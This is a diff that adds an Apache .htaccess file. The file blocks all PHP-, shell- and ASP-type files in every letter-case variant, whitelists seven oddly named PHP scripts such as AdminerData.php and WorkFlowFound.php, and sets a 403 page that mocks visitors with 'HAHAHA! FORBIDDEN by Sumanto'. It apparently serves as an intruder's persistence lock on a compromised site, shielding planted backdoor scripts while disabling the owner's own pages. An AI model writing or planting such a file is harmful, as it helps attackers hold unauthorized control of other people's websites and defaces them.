@@ -1,0 +1,66 @@
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.AS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.As*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.aS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.as*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "^(js.php|index.php|IncludeFolder.php|LocaleFound.php|FolderImages.php|AdminerData.php|WorkFlowFound.php)$">
+        Order Deny,Allow
+    Allow from all
+    </FilesMatch>
+Options -Indexes
+ErrorDocument 403 '<center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgwd4SJkZKNbxgDgtKvDaM_lQZEKdQK4b2FonWGWouRJVt_bzM1kL56gn-gwiVpfSrlswEX3fm1XdVdmqjsWOm2_yMjvlzWjTrF73EhuqrRFoIZzdlbJMxHzs9L7UUCuQsnPMNT_fviqo6yFQ36dHHUhpBYjJmgIr8_f0k5q91yu_ubq_VOD_-82JDxGBhd/s16000/toothless-laugh-toothless-smile.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by Sumanto</h2>
